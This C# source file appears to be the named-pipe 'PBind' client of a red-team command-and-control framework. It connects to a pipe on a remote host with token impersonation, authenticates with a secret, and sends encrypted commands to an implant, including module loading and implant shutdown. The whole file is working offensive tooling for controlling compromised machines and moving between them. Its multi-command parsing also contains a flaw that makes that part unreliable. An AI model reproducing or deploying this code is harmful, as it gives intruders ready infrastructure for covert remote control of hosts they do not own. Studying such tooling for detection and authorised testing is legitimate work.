using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.IO;
using System.Linq;
using System.Text;
using System.Security.Principal;

public static class PBind
{
    private const string MULTI_COMMAND_PREFIX = "multicmd";
    private const string COMMAND_SEPARATOR = "!d-3dion@LD!-d";
    private static volatile bool _pbindConnected;
    private static volatile NamedPipeClientStream _pipeStream;
    private static volatile StreamReader _pipeReader;
    private static volatile StreamWriter _pipeWriter;
    private static string _encryptionKey = "";
    private static readonly object LOCK = new object();
    private static bool _alreadyWaitingForCommand;

    public static void Main(string[] args)
    {
        try
        {
            if (args.Length == 5 && args[0].ToLower() == "start") // If in format 'Start <hostname> <pipename> <secret> <key>'
            {
                Start(args);
            }
            else if (_pbindConnected && _pipeStream.IsConnected)
            {
                HandleCommand(args);
            }
            else if (_pbindConnected && !_pipeStream.IsConnected)
            {
                Console.WriteLine("[PBind Client][-] Pipe has disconnected, re-run pbind-connect to reconnect");
                _pbindConnected = false;
            }
            else
            {
                Console.WriteLine("[PBind Client][-] PBind not connected");
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"PBind error: \n{e}");
        }
    }

    private static void HandleCommand(IReadOnlyList<string> args)
    {

        var command = args[0].Trim();

        string[] commands;
        if (command.StartsWith(MULTI_COMMAND_PREFIX))
        {
            commands = command.Skip(MULTI_COMMAND_PREFIX.Length).ToString().Split(new[] { COMMAND_SEPARATOR }, StringSplitOptions.RemoveEmptyEntries);
        }
        else
        {
            commands = new[] { command };
        }

        foreach (var taskIdAndCommand in commands)
        {
            
            var taskId = taskIdAndCommand.Substring(0, 5);
            var individualCommand = taskIdAndCommand.Substring(5);

#if DEBUG
            Utils.TrimmedPrint("[PBind Client][*] Got encoded taskIdAndCommand: ", taskIdAndCommand);
            Utils.TrimmedPrint("[PBind Client][*] Got encoded command: ", command);
#endif
            var mutableIndividualCommand = individualCommand;
            if (!mutableIndividualCommand.StartsWith("load-module") && !mutableIndividualCommand.StartsWith("kill-implant"))
            {
#if DEBUG
                Console.WriteLine("[PBind Client][*] Not a load-module or kill-implant, decoding entire command");
#endif
                var data = Convert.FromBase64String(mutableIndividualCommand);
                mutableIndividualCommand = Encoding.UTF8.GetString(data);
            }

            var newCommand = taskId + mutableIndividualCommand;
#if DEBUG
            Utils.TrimmedPrint("New command: ", newCommand);
#endif
            IssueCommand(newCommand);

            if (mutableIndividualCommand == "kill-implant" || mutableIndividualCommand == "pbind-unlink")
            {
                _pbindConnected = false;
                _pipeStream.Dispose();
            }
        }
    }

    private static void Start(string[] args)
    {
        if (_pbindConnected && _pipeStream.IsConnected)
        {
            try
            {
                _pipeStream.WaitForPipeDrain();
                Console.WriteLine("[PBind Client][-] PBind already connected");
            }
            catch (Exception)
            {
                _pbindConnected = false;
                _encryptionKey = args[4];
                Console.WriteLine($"[PBind Client][+] Connecting to: {args[1]} pipe: {args[2]} with secret {args[3]} and key {_encryptionKey}");
                _pbindConnected = Connect(args[1], args[2], args[3], _encryptionKey);
            }
        }
        else
        {
            _pbindConnected = false;
            _encryptionKey = args[4];
            Console.WriteLine($"[PBind Client][+] Connecting to: {args[1]} pipe: {args[2]} with secret {args[3]} and key {_encryptionKey}");
            _pbindConnected = Connect(args[1], args[2], args[3], _encryptionKey);
        }
    }

    private static bool Connect(string hostname, string pipeName, string secret, string encryptionKey)
    {
        if (hostname.ToLower() == "127.0.0.1" || hostname.ToLower() == "localhost")
        {
            _pipeStream = new NamedPipeClientStream(pipeName);
        }
        else
        {
            _pipeStream = new NamedPipeClientStream(hostname, pipeName, PipeDirection.InOut, PipeOptions.None, TokenImpersonationLevel.Impersonation);
        }

        _pipeReader = new StreamReader(_pipeStream);
        _pipeWriter = new StreamWriter(_pipeStream);

        try
        {
            _pipeStream.Connect(30000);
            _pipeWriter.AutoFlush = true;
        }
        catch (Exception e)
        {
            Console.WriteLine($"[PBind Client][-] Error connecting to pipe: {e}");
            return false;
        }

        if (_pipeStream.CanWrite)
        {
            _pipeWriter.WriteLine(secret);
        }
        else
        {
            Console.WriteLine("[PBind Client][-] Cannot write to pipe");
            return false;
        }

        if (_pipeStream.CanRead)
        {
            try
            {
                var clientInfo = Encoding.UTF8.GetString(Encryption.Decrypt(encryptionKey, _pipeReader.ReadLine()));

                if (!clientInfo.StartsWith("PBind-Connected"))
                {
                    Console.WriteLine($"[PBind Client][-] Error - decrypted response on pipe connect was invalid: {clientInfo}");
                    return false;
                }

                Console.WriteLine(clientInfo);
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[PBind Client][-] Error decrypting response: {e}");
                return false;
            }
        }

        Console.WriteLine("[PBind Client][-] Cannot read from pipe");
        return false;
    }

    private static void IssueCommand(string command)
    {
        if (!_pipeStream.IsConnected)
        {
            _pbindConnected = false;
            Console.WriteLine("$[PBind Client][-] The PBind pipe is no longer connected");
            _pipeReader.Dispose();
            _pipeWriter.Dispose();
            _pipeStream.Dispose();
        }

        lock (LOCK)
        {
            try
            {
                string line;
                string response;
                if (!_alreadyWaitingForCommand)
                {
                    line = _pipeReader.ReadLine();

                    while (string.IsNullOrWhiteSpace(line))
                    {
                        line = _pipeReader.ReadLine();
                    }
#if DEBUG
                    Utils.TrimmedPrint("[PBind Client][*] Got encrypted base64 encoded response: ", line);
#endif

                    response = Encoding.UTF8.GetString(Encryption.Decrypt(_encryptionKey, line)).TrimEnd('\0');
#if DEBUG
                    Utils.TrimmedPrint("[PBind Client][*] Decrypted response from pipe: ", response);
#endif
                    if (response != "COMMAND")
                    {
#if DEBUG
                        Utils.TrimmedPrint("[PBind Client][-] Error, received unexpected response on pipe: ", response);
#endif
                        throw new Exception("0x1001");
                    }
#if DEBUG
                    Utils.TrimmedPrint("[PBind Client][*] Issuing command: ", command);
#endif
                }
                else
                {
#if DEBUG
                    Utils.TrimmedPrint("[PBind Client][*] Pipe already waiting for command, skipping read...");
#endif
                }

                if (command == "kill-implant")
                {
                    command = "exit";
                }

                var encryptedCommand = Encryption.Encrypt(_encryptionKey, command);
                _pipeWriter.WriteLine(encryptedCommand);

#if DEBUG
                Console.WriteLine("[PBind Client][*] Waiting for command response");
#endif
                line = _pipeReader.ReadLine();
                if (string.IsNullOrWhiteSpace(line))
                {
#if DEBUG
                    Console.WriteLine("[PBind Client][-] Got empty response");
#endif
                    Console.WriteLine();
                }
#if DEBUG
                Utils.TrimmedPrint("[PBind Client][*] Got encrypted encoded response: ", line);
#endif
                response = Encoding.UTF8.GetString(Encryption.Decrypt(_encryptionKey, line));

                if (response.TrimEnd('\0') == "COMMAND")
                {
                    Console.WriteLine("");
                    _alreadyWaitingForCommand = true;
                    return;
                }

                Console.WriteLine(response);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[PBind Client][-] Error in PBind Command Loop: {e}");
            }
        }
    }
}